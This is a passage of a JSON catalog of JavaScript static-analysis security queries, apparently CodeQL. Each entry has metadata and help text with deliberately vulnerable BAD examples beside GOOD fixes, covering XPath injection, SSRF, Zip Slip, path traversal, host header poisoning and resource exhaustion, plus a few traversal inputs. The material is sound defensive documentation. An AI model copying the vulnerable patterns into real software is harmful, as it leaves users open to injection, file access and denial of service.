    "help": "# Untrusted data passed to external API with additional heuristic sources\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third-party dependencies or from internal dependencies. The query reports uses of untrusted data one of the arguments of external API call or in the return value from a callback passed to an external API.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a query parameter is read from the `req` parameter and then ultimately used in a call to the `res.send` external API:\n\n\n```javascript\nexpress().get('/news', (req, res) => {\n    let topic = req.query.topic;\n    res.send(`<h1>${topic}</h1>`);\n});\n\n```\nThis is a reflected XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a query parameter is read from `req`.\n\n\n```javascript\nlet path = require('path');\n\nexpress().get('/data', (req, res) => {\n    let file = path.join(HOME_DIR, 'public', req.query.file);\n    res.sendFile(file);\n});\n\n```\nIf the query reported the call to `path.join` on line 4, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems the result of the `path.join` will be used as a file path, leading to a path traversal vulnerability.\n\nNote that both examples are correctly handled by the standard taint tracking library and security queries.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/empty-password-in-configuration-file": {
    "name": "Empty password in configuration file",
    "description": "Failing to set a password reduces the security of your code.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "js/empty-password-in-configuration-file",
    "tags": [
      "security",
      "external/cwe/cwe-258",
      "external/cwe/cwe-862"
    ],
    "filename": "8a0be1e4-EmptyPasswordInConfigurationFile",
    "language": "javascript",
    "help": "# Empty password in configuration file\nThe use of an empty string as a password in a configuration file is not secure.\n\n\n## Recommendation\nChoose a strong password and encrypt it if it has to be stored in a configuration file.\n\n\n## References\n* Common Weakness Enumeration: [CWE-258](https://cwe.mitre.org/data/definitions/258.html).\n* Common Weakness Enumeration: [CWE-862](https://cwe.mitre.org/data/definitions/862.html).\n"
  },
  "js/xpath-injection": {
    "name": "XPath injection",
    "description": "Building an XPath expression from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/xpath-injection",
    "tags": [
      "security",
      "external/cwe/cwe-643"
    ],
    "filename": "5573ab70-XpathInjection",
    "language": "javascript",
    "help": "# XPath injection\nIf an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.\n\n\n## Recommendation\nIf user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.\n\n\n## Example\nIn this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.\n\n\n```javascript\nconst express = require('express');\nconst xpath = require('xpath');\nconst app = express();\n\napp.get('/some/route', function(req, res) {\n  let userName = req.param(\"userName\");\n\n  // BAD: Use user-provided data directly in an XPath expression\n  let badXPathExpr = xpath.parse(\"//users/user[login/text()='\" + userName + \"']/home_dir/text()\");\n  badXPathExpr.select({\n    node: root\n  });\n});\n\n```\nInstead, embed the user input using the variable replacement mechanism offered by `xpath`:\n\n\n```javascript\nconst express = require('express');\nconst xpath = require('xpath');\nconst app = express();\n\napp.get('/some/route', function(req, res) {\n  let userName = req.param(\"userName\");\n\n  // GOOD: Embed user-provided data using variables\n  let goodXPathExpr = xpath.parse(\"//users/user[login/text()=$userName]/home_dir/text()\");\n  goodXPathExpr.select({\n    node: root,\n    variables: { userName: userName }\n  });\n});\n\n```\n\n## References\n* OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).\n* OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).\n* npm: [xpath](https://www.npmjs.com/package/xpath).\n* Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).\n"
  },
  "javascript/ssrf": {
    "id": "javascript/ssrf",
    "kind": "path-problem",
    "name": "Uncontrolled data used in network request",
    "description": "Sending network requests with user-controlled data as part of the URL allows for request forgery attacks.",
    "problem.severity": "error",
    "precision": "medium",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-918"
    ],
    "filename": "d9aa0ef9-SSRF",
    "language": "javascript",
    "help": "# Uncontrolled data used in network request\nDirectly incorporating user input into an HTTP request without validating the input can facilitate server side request forgery attacks, where the attacker essentially controls the request.\n\n\n## Recommendation\nTo guard against server side request forgery, it is advisable to avoid putting user input directly into a network request. If using user input is necessary, then is mandatory to validate them. Only allow numeric and alphanumeric values. URL encoding is not a solution in certain scenarios, such as, an architecture build over NGINX proxies.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL request without validating the input, which facilitates an SSRF attack. The request `axios.get(\"https://example.com/current_api/\"+target)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `\"../super_secret_api\"` as the target, causing the URL to become `\"https://example.com/super_secret_api\"`.\n\nA request to `https://example.com/super_secret_api` may be problematic if that api is not meant to be directly accessible from the attacker's machine.\n\n\n```javascript\nconst axios = require('axios');\n\nexport const handler = async (req, res, next) => {\n  const { target\u00a0} = req.body;\n\n  try {\n    // BAD: `target` is controlled by the attacker\n    const response = await axios.get('https://example.com/current_api/' + target);\n\n    // process request response\n    use(response);\n  } catch (err) {\n    // process error\n  }\n};\n\n```\nOne way to remedy the problem is to validate the user input to only allow alphanumeric values:\n\n\n```javascript\nconst axios = require('axios');\nconst validator = require('validator');\n\nexport const handler = async (req, res, next) => {\n  const { target\u00a0} = req.body;\n\n  if (!validator.isAlphanumeric(target)) {\n    return next(new Error('Bad request'));\n  }\n\n  try {\n    // `target` is validated\n    const response = await axios.get('https://example.com/current_api/' + target);\n\n    // process request response\n    use(response);\n  } catch (err) {\n    // process error\n  }\n};\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "js/env-value-injection": {
    "name": "User controlled environment variable value injection",
    "description": "assigning important environment variables from user controlled data is not secure",
    "kind": "path-problem",
    "id": "js/env-value-injection",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "fce8af0a-EnvValueInjection",
    "language": "javascript",
    "help": "# User controlled environment variable value injection\nAssigning Value to environment variables from user-controllable data is not safe.\n\n\n## Recommendation\nRestrict this operation only to privileged users or only for some not important environment variables.\n\n\n## Example\nThe following example allows unauthorized users to assign a value to a critical environment variable.\n\n\n```javascript\nconst http = require('node:http');\n\nhttp.createServer((req, res) => {\n  const { EnvValue } = req.body;\n  process.env[\"A_Critical_Env\"] = EnvValue; // NOT OK\n\n  res.end('env has been injected!');\n});\n```\n\n## References\n* [Admin account TakeOver in mintplex-labs/anything-llm](https://huntr.com/bounties/00ec6847-125b-43e9-9658-d3cace1751d6/)\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "js/regex-injection": {
    "name": "Regular expression injection",
    "description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to inject an expression that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/regex-injection",
    "tags": [
      "security",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "d4b8aaad-RegExpInjection",
    "language": "javascript",
    "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // BAD: Unsanitized user input is used to construct a regular expression\n  var re = new RegExp(\"\\\\b\" + key + \"=(.*)\\n\");\n});\n\n```\nInstead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.\n\n\n```javascript\nvar express = require('express');\nvar _ = require('lodash');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // GOOD: User input is sanitized before constructing the regex\n  var safeKey = _.escapeRegExp(key);\n  var re = new RegExp(\"\\\\b\" + safeKey + \"=(.*)\\n\");\n});\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* npm: [lodash](https://www.npmjs.com/package/lodash).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/xpath-injection-more-sources": {
    "name": "XPath injection with additional heuristic sources",
    "description": "Building an XPath expression from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/xpath-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-643"
    ],
    "filename": "f7467ca5-XpathInjection",
    "language": "javascript",
    "help": "# XPath injection with additional heuristic sources\nIf an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.\n\n\n## Recommendation\nIf user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.\n\n\n## Example\nIn this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.\n\n\n```javascript\nconst express = require('express');\nconst xpath = require('xpath');\nconst app = express();\n\napp.get('/some/route', function(req, res) {\n  let userName = req.param(\"userName\");\n\n  // BAD: Use user-provided data directly in an XPath expression\n  let badXPathExpr = xpath.parse(\"//users/user[login/text()='\" + userName + \"']/home_dir/text()\");\n  badXPathExpr.select({\n    node: root\n  });\n});\n\n```\nInstead, embed the user input using the variable replacement mechanism offered by `xpath`:\n\n\n```javascript\nconst express = require('express');\nconst xpath = require('xpath');\nconst app = express();\n\napp.get('/some/route', function(req, res) {\n  let userName = req.param(\"userName\");\n\n  // GOOD: Embed user-provided data using variables\n  let goodXPathExpr = xpath.parse(\"//users/user[login/text()=$userName]/home_dir/text()\");\n  goodXPathExpr.select({\n    node: root,\n    variables: { userName: userName }\n  });\n});\n\n```\n\n## References\n* OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).\n* OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).\n* npm: [xpath](https://www.npmjs.com/package/xpath).\n* Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).\n"
  },
  "js/zipslip": {
    "name": "Arbitrary file access during archive extraction (\"Zip Slip\")",
    "description": "Extracting files from a malicious ZIP file, or similar type of archive, without validating that the destination file path is within the destination directory can allow an attacker to unexpectedly gain access to resources.",
    "kind": "path-problem",
    "id": "js/zipslip",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-022"
    ],
    "filename": "f8e5d674-ZipSlip",
    "language": "javascript",
    "help": "# Arbitrary file access during archive extraction (\"Zip Slip\")\nExtracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.\n\nZip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a zip file contains a file entry `..\\sneaky-file`, and the zip file is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a zip archive entry is to check that `\"..\"` does not occur in the path.\n\n\n## Example\nIn this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.\n\n\n```javascript\nconst fs = require('fs');\nconst unzip = require('unzip');\n\nfs.createReadStream('archive.zip')\n  .pipe(unzip.Parse())\n  .on('entry', entry => {\n    const fileName = entry.path;\n    // BAD: This could write any file on the filesystem.\n    entry.pipe(fs.createWriteStream(fileName));\n  });\n\n```\nTo fix this vulnerability, we need to check that the path does not contain any `\"..\"` elements in it.\n\n\n```javascript\nconst fs = require('fs');\nconst unzip = require('unzip');\n\nfs.createReadStream('archive.zip')\n  .pipe(unzip.Parse())\n  .on('entry', entry => {\n    const fileName = entry.path;\n    // GOOD: ensures the path is safe to write to.\n    if (fileName.indexOf('..') == -1) {\n      entry.pipe(fs.createWriteStream(fileName));\n    }\n    else {\n      console.log('skipping bad path', fileName);\n    }\n  });\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "js/host-header-forgery-in-email-generation": {
    "name": "Host header poisoning in email generation",
    "description": "Using the HTTP Host header to construct a link in an email can facilitate phishing attacks and leak password reset tokens.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/host-header-forgery-in-email-generation",
    "tags": [
      "security",
      "external/cwe/cwe-640"
    ],
    "filename": "659523af-HostHeaderPoisoningInEmailGeneration",
    "language": "javascript",
    "help": "# Host header poisoning in email generation\nUsing the HTTP Host header to construct a link in an email can facilitate phishing attacks and leak password reset tokens. A malicious user can send an HTTP request to the targeted web site, but with a Host header that refers to his own web site. This means the emails will be sent out to potential victims, originating from a server they trust, but with links leading to a malicious web site.\n\nIf the email contains a password reset link, and should the victim click the link, the secret reset token will be leaked to the attacker. Using the leaked token, the attacker can then construct the real reset link and use it to change the victim's password.\n\n\n## Recommendation\nObtain the server's host name from a configuration file and avoid relying on the Host header.\n\n\n## Example\nThe following example uses the `req.host` to generate a password reset link. This value is derived from the Host header, and can thus be set to anything by an attacker:\n\n\n```javascript\nlet nodemailer = require('nodemailer');\nlet express = require('express');\nlet backend = require('./backend');\n\nlet app = express();\n\nlet config = JSON.parse(fs.readFileSync('config.json', 'utf8'));\n\napp.post('/resetpass', (req, res) => {\n  let email = req.query.email;\n  let transport = nodemailer.createTransport(config.smtp);\n  let token = backend.getUserSecretResetToken(email);\n  transport.sendMail({\n    from: 'webmaster@example.com',\n    to: email,\n    subject: 'Forgot password',\n    text: `Click to reset password: https://${req.host}/resettoken/${token}`,\n  });\n});\n\n```\nTo ensure the link refers to the correct web site, get the host name from a configuration file:\n\n\n```javascript\nlet nodemailer = require('nodemailer');\nlet express = require('express');\nlet backend = require('./backend');\n\nlet app = express();\n\nlet config = JSON.parse(fs.readFileSync('config.json', 'utf8'));\n\napp.post('/resetpass', (req, res) => {\n  let email = req.query.email;\n  let transport = nodemailer.createTransport(config.smtp);\n  let token = backend.getUserSecretResetToken(email);\n  transport.sendMail({\n    from: 'webmaster@example.com',\n    to: email,\n    subject: 'Forgot password',\n    text: `Click to reset password: https://${config.hostname}/resettoken/${token}`,\n  });\n});\n\n```\n\n## References\n* Mitre: [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html).\n* Ian Muscat: [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/).\n* Common Weakness Enumeration: [CWE-640](https://cwe.mitre.org/data/definitions/640.html).\n"
  },
  "js/untrusted-data-to-external-api": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "js/untrusted-data-to-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "bc247e13-UntrustedDataToExternalAPI",
    "language": "javascript",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third-party dependencies or from internal dependencies. The query reports uses of untrusted data one of the arguments of external API call or in the return value from a callback passed to an external API.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a query parameter is read from the `req` parameter and then ultimately used in a call to the `res.send` external API:\n\n\n```javascript\nexpress().get('/news', (req, res) => {\n    let topic = req.query.topic;\n    res.send(`<h1>${topic}</h1>`);\n});\n\n```\nThis is a reflected XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a query parameter is read from `req`.\n\n\n```javascript\nlet path = require('path');\n\nexpress().get('/data', (req, res) => {\n    let file = path.join(HOME_DIR, 'public', req.query.file);\n    res.sendFile(file);\n});\n\n```\nIf the query reported the call to `path.join` on line 4, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems the result of the `path.join` will be used as a file path, leading to a path traversal vulnerability.\n\nNote that both examples are correctly handled by the standard taint tracking library and security queries.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/useless-regexp-character-escape": {
    "name": "Useless regular-expression character escape",
    "description": "Prepending a backslash to an ordinary character in a string does not have any effect, and may make regular expressions constructed from this string behave unexpectedly.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/useless-regexp-character-escape",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-UselessRegExpCharacterEscape",
    "language": "javascript",
    "help": "# Useless regular-expression character escape\nWhen a character in a string literal or regular expression literal is preceded by a backslash, it is interpreted as part of an escape sequence. For example, the escape sequence `\\n` in a string literal corresponds to a single `newline` character, and not the `\\` and `n` characters. However, not all characters change meaning when used in an escape sequence. In this case, the backslash just makes the character appear to mean something else, and the backslash actually has no effect. For example, the escape sequence `\\k` in a string literal just means `k`. Such superfluous escape sequences are usually benign, and do not change the behavior of the program.\n\nThe set of characters that change meaning when in escape sequences is different for regular expression literals and string literals. This can be problematic when a regular expression literal is turned into a regular expression that is built from one or more string literals. The problem occurs when a regular expression escape sequence loses its special meaning in a string literal.\n\n\n## Recommendation\nEnsure that the right amount of backslashes is used when escaping characters in strings, template literals and regular expressions. Pay special attention to the number of backslashes when rewriting a regular expression as a string literal.\n\n\n## Example\nThe following example code checks that a string is `\"my-marker\"`, possibly surrounded by white space:\n\n\n```javascript\nlet regex = new RegExp('(^\\s*)my-marker(\\s*$)'),\n    isMyMarkerText = regex.test(text);\n\n```\nHowever, the check does not work properly for white space as the two `\\s` occurrences are semantically equivalent to just `s`, meaning that the check will succeed for strings like `\"smy-markers\"` instead of `\" my-marker \"`. Address these shortcomings by either using a regular expression literal (`/(^\\s*)my-marker(\\s*$)/`), or by adding extra backslashes (`'(^\\\\s*)my-marker(\\\\s*$)'`).\n\n\n## References\n* MDN: [Regular expression escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Escaping)\n* MDN: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/resource-exhaustion": {
    "name": "Resource exhaustion",
    "description": "Allocating objects or timers with user-controlled sizes or durations can cause resource exhaustion.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "id": "js/resource-exhaustion",
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-400",
      "external/cwe/cwe-770"
    ],
    "filename": "12649d14-ResourceExhaustion",
    "language": "javascript",
    "help": "# Resource exhaustion\nApplications are constrained by how many resources they can make use of. Failing to respect these constraints may cause the application to be unresponsive or crash. It is therefore problematic if attackers can control the sizes or lifetimes of allocated objects.\n\n\n## Recommendation\nEnsure that attackers can not control object sizes and their lifetimes. If object sizes and lifetimes must be controlled by external parties, ensure you restrict the object sizes and lifetimes so that they are within acceptable ranges.\n\n\n## Example\nThe following example allocates a buffer with a user-controlled size.\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet buffer = Buffer.alloc(size); // BAD\n\n\t// ... use the buffer\n});\n```\nThis is problematic since an attacker can choose a size that makes the application run out of memory. Even worse, in older versions of Node.js, this could leak confidential memory. To prevent such attacks, limit the buffer size:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use the buffer\n});\n```\n\n## Example\nAs another example, consider an application that allocates an array with a user-controlled size, and then fills it with values:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet dogs = new Array(size).fill(\"dog\"); // BAD\n\n\t// ... use the dog\n});\n```\nThe allocation of the array itself is not problematic since arrays are allocated sparsely, but the subsequent filling of the array will take a long time, causing the application to be unresponsive, or even run out of memory. Again, a limit on the size will prevent the attack:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t// ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets a user choose a delay after which a function is executed:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\tsetTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large delay essentially makes the application wait indefinitely before executing the function. Repeated registrations of such delays will therefore use up all of the memory in the application. A limit on the delay will prevent the attack:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  },
  "js/template-object-injection": {
    "name": "Template Object Injection",
    "description": "Instantiating a template using a user-controlled object is vulnerable to local file read and potential remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/template-object-injection",
    "tags": [
      "security",
      "external/cwe/cwe-073",
      "external/cwe/cwe-094"
    ],
    "filename": "f04497e0-TemplateObjectInjection",
    "language": "javascript",
    "help": "# Template Object Injection\nDirectly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.\n\n\n## Recommendation\nAvoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.\n\n\n## Example\nIn the example below a server uses the user-controlled `profile` object to render the `index` template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', profile);\n});\n```\nHowever, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.\n\nThe fix is to have the server construct the object, and only add the properties that are needed by the template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', {\n        name: profile.name,\n        location: profile.location\n    });\n});\n```\n\n## References\n* blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).\n* cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "js/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073",
      "external/cwe/cwe-099"
    ],
    "filename": "f8e5d674-TaintedPath",
    "language": "javascript",
    "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = 